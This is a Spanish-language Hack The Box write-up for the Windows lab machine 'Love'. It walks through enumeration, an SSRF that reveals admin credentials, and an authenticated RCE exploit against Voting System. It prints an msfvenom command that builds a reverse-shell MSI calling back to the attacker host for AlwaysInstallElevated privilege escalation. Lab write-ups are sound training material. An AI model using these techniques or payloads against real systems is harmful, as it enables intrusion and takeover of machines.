---
title: Love (Hack The Box)
author: J0lm3d0
date: 2021-08-07 21:00:00 +0200
categories: [HackTheBox]
tags: [windows, ssrf, voting_system, cve, alwaysinstallelevated_privilege]
pin: false
---

En este documento se recogen los pasos a seguir para la resolución de la máquina Love de la plataforma HackTheBox. Se trata de una máquina Windows de 64 bits, que posee una dificultad fácil de resolución según la plataforma.

![Logo de la máquina](/assets/img/HTB/Love/machine.png)

[Write-up en PDF realizado mediante LaTeX](/pdfs/Write_up_Love.pdf)

## Enumeración de servicios y recopilación de información sensible

Lo primero a realizar es un escaneo de todo el rango de puertos TCP mediante la herramienta `Nmap`.

```bash
# nmap -p- --open -T5 -n -vv 10.10.10.239

Not shown: 58766 closed ports, 6750 filtered ports
Reason: 58766 resets and 6750 no-responses
PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
443/tcp   open  https        syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
3306/tcp  open  mysql        syn-ack ttl 127
5000/tcp  open  upnp         syn-ack ttl 127
5040/tcp  open  unknown      syn-ack ttl 127
5985/tcp  open  wsman        syn-ack ttl 127
5986/tcp  open  wsmans       syn-ack ttl 127
7680/tcp  open  pando-pub    syn-ack ttl 127
47001/tcp open  winrm        syn-ack ttl 127
49664/tcp open  unknown      syn-ack ttl 127
49665/tcp open  unknown      syn-ack ttl 127
49666/tcp open  unknown      syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49668/tcp open  unknown      syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127
49670/tcp open  unknown      syn-ack ttl 127
```

Tras obtener los puertos que la máquina tiene abiertos, aplico scripts básicos de enumeración y utilizo la flag -sV para intentar conocer la versión y servicio que están ejecutando cada uno de esos puertos.

```bash
# nmap -p 22,80 -sC -sV 10.10.10.239

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Voting System using PHP
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql?
5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
5040/tcp  open  unknown
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=LOVE
| Subject Alternative Name: DNS:LOVE, DNS:Love
| Not valid before: 2021-04-11T14:39:19
|_Not valid after:  2024-04-10T14:39:19
|_ssl-date: 2021-07-18T22:41:47+00:00; +21m35s from scanner time.
| tls-alpn: 
|_  http/1.1
7680/tcp  open  pando-pub?
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h06m35s, deviation: 3h30m02s, median: 21m34s
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-07-18T15:41:37-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-18T22:41:33
|_  start_date: N/A
```

En este segundo escaneo `Nmap` consigue, a través del certificado SSL que utiliza el servicio HTTPS, enumerar el subdominio "staging.love.htb". Con esta información, procedo a añadir el dominio principal y subdominio a mi fichero local "/etc/hosts'"".

![Dominio añadido al fichero "/etc/hosts"](/assets/img/HTB/Love/hosts.png)

Una vez añadidos los dominios, paso a enumerar el contenido web de cada uno de ellos mediante un navegador. Al acceder al dominio mediante el servicio HTTPS me salta un error "403 Forbidden", por lo que pruebo el acceso mediante el servicio HTTP y observo una página de login, aunque en estos momentos aún no dispongo de credenciales de ningún tipo.

![Página de login del dominio principal "love.htb"](/assets/img/HTB/Love/mainpage.png)

Por otro lado, también compruebo el contenido del subdominio "staging.love.htb". Nuevamente, me da el error 403 al acceder mediante HTTPS, por lo que vuelvo a hacerlo mediante HTTP. En la siguiente imagen se puede ver el contenido de la página web, que parece tratarse de un escáner para detectar malware en archivos:

![Página web del subdominio "staging.love.htb"](/assets/img/HTB/Love/stagingpage.png)

Pruebo a registrarme a través de los campos que aparecen, pero compruebo que no es funcional. Por lo que paso a la pestaña "Demo", en la que aparece una barra de búsqueda en la que hay que introducir la URL del archivo que se quiere escanear.

![Demo del escáner de archivos](/assets/img/HTB/Love/stagingdemo.png)

Con la información recopilada, no tengo forma de avanzar en la resolución de la máquina, ya que no dispongo de credenciales ni he conseguido enumerar ningún servicio crítico. Por tanto, pruebo a enumerar otro servicio HTTP detectado en el puerto 5000 durante la primera fase de reconocimiento. Pero, al intentar acceder a este servicio, me encuentro de nuevo con un error "403 Forbidden".

![Error 403 en el servicio HTTP del puerto 5000](/assets/img/HTB/Love/forbidden5000.png)

En este punto, se me ocurre utilizar el buscador de URLs del servicio de escaneo de archivos enumerado anteriormente, para acceder de forma local al servicio HTTP del puerto 5000, ya que puede contar con algún tipo de regla que permita el acceso a redes internas, pero no externas. Al introducir la URL (http://localhost:5000), se me muestra el contenido web, que consiste en un panel en el que se muestran las credenciales del usuario "admin".

![Contenido del servicio HTTP del puerto 5000](/assets/img/HTB/Love/5000page.png)

Con las credenciales obtenidas, pruebo a acceder desde el portal de login que hemos visualizado anteriormente, pero me salta un error de credenciales incorrectas.

![Error de credenciales incorrectas en el panel login de "love.htb"](/assets/img/HTB/Love/noaccess.png)

En este punto me encontré un poco perdido, ya que intenté enumerar algún otro servicio como SMB o MySQL sin obtener ningún resultado. Tras esto, se me ocurrió probar una búsqueda de directorios y/o ficheros en el servidor web con `Gobuster`, para ver si encontraba algo que me podía ser de utilidad.

```
# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.239/ -t 70

/images               (Status: 301) [Size: 338] [--> http://10.10.10.239/images/]
/Images               (Status: 301) [Size: 338] [--> http://10.10.10.239/Images/]
/admin                (Status: 301) [Size: 337] [--> http://10.10.10.239/admin/] 
/plugins              (Status: 301) [Size: 339] [--> http://10.10.10.239/plugins/]
/includes             (Status: 301) [Size: 340] [--> http://10.10.10.239/includes/]
/examples             (Status: 503) [Size: 402]                                    
/dist                 (Status: 301) [Size: 336] [--> http://10.10.10.239/dist/]    
/licenses             (Status: 403) [Size: 421]                                    
/IMAGES               (Status: 301) [Size: 338] [--> http://10.10.10.239/IMAGES/]  
/%20                  (Status: 403) [Size: 302]                                    
/Admin                (Status: 301) [Size: 337] [--> http://10.10.10.239/Admin/]   
/*checkout*           (Status: 403) [Size: 302]                                    
/Plugins              (Status: 301) [Size: 339] [--> http://10.10.10.239/Plugins/] 
/phpmyadmin           (Status: 403) [Size: 302]                                    
/webalizer            (Status: 403) [Size: 302]
```

De estas rutas obtenidas, la que más me llama la atención es la de "admin", por lo que pruebo a acceder y, para mí sorpresa, encuentro un panel login idéntico al de "love.htb".

![Cookie de autenticación asignada al acceder a la plataforma web](/assets/img/HTB/Love/adminpage.png)

De nuevo, pruebo a intentar acceder utilizando las credenciales obtenidas anteriormente, consiguiendo acceder con éxito al panel de administrador.

![Panel de administrador de la plataforma Voting System](/assets/img/HTB/Love/votingsystemadmin.png)

## Acceso a la máquina

Una vez dentro de la plataforma, intento buscar formas de subir algún archivo PHP o similar para poder obtener ejecución de comandos en la máquina víctima. Pero, al no obtener resultado, pruebo a buscar la plataforma en `SearchSploit` para comprobar si existe algún exploit.

```
# searchsploit Voting System

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Online Voting System - Authentication Bypass                                                                                                                                                             | php/webapps/43967.py
Online Voting System 1.0 - Authentication Bypass (SQLi)                                                                                                                                                  | php/webapps/50075.txt
Online Voting System 1.0 - Remote Code Execution (Authenticated)                                                                                                                                         | php/webapps/50076.txt
Online Voting System 1.0 - SQLi (Authentication Bypass) + Remote Code Execution (RCE)                                                                                                                    | php/webapps/50088.py
Online Voting System Project in PHP - 'username' Persistent Cross-Site Scripting                                                                                                                         | multiple/webapps/49159.txt
Voting System 1.0 - Authentication Bypass (SQLI)                                                                                                                                                         | php/webapps/49843.txt
Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)                                                                                                                                | php/webapps/49445.py
Voting System 1.0 - Remote Code Execution (Unauthenticated)                                                                                                                                              | php/webapps/49846.txt
Voting System 1.0 - Time based SQLI  (Unauthenticated SQL injection)                                                                                                                                     | php/webapps/49817.txt
WordPress Plugin Poll_ Survey_ Questionnaire and Voting system 1.5.2 - 'date_answers' Blind SQL Injection                                                                                                | php/webapps/50052.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

Como se observa, hay varios exploits que afectan a la plataforma web utilizada. En este caso, me quedo con el exploit en Python que permite una Ejecución Remota de Código (RCE) estando autenticado en la plataforma. Antes de proceder a la ejecución de este exploit, se deben modificar en el código los valores que se muestran en la siguiente imagen:

![Valores a modificar en el exploit de Python](/assets/img/HTB/Love/exploit49445.png)

Una vez modificado el exploit, me pongo a la escucha por el puerto definido y ejecuto el exploit obteniendo una conexión en mi máquina de atacante.

![Obtención de shell en máquina atacante](/assets/img/HTB/Love/revshell.png)

Con la shell obtenida, ya puedo acceder al directorio del usuario no privilegiado Phoebe y visualizar la flag.

```
type user.txt

8ad895c498ac7a42f8aa349704b6ddb0
```

## Escalada de privilegios

Para la escalada de privilegios en este sistema Windows, he transferido el ejecutable de `WinPEAS` a la máquina víctima y lo he ejecutado. Tras revisar los resultados arrojados, uno de los más interesantes y que el propio script te refleja en color rojo es el que se refleja en la siguiente imagen:

![Agujero de seguridad descubierto por el script WinPEAS](/assets/img/HTB/Love/alwaysinstallelevated.png)

La política "AlwaysInstallElevated" se encuentra habilitada en el registro de Windows, una configuración que puede explotarse para escalar privilegios. Los pasos a seguir se reflejan en este [artículo](https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/). Lo primero a realizar es crear un ejecutable malicioso en formato .msi que se encargará de enviar una shell como usuario Administrador a mi máquina de atacante. Este ejecutable lo he creado mediante la utilidad `MSFVenom`.

```
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.75 LPORT=445 -f msi > payload.msi

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
```

Una vez creado el ejecutable, lo transfiero a la máquina, me pongo a la escucha por el puerto definido al crear el fichero y lo ejecuto con las flags "/quiet", "/i" y "/qn", obteniendo así una conexión en mi máquina de atacante y pudiendo visualizar la flag final.

![Obtenemos una shell con privilegios de "root" y visualizamos la flag](/assets/img/HTB/Love/rooted.png)
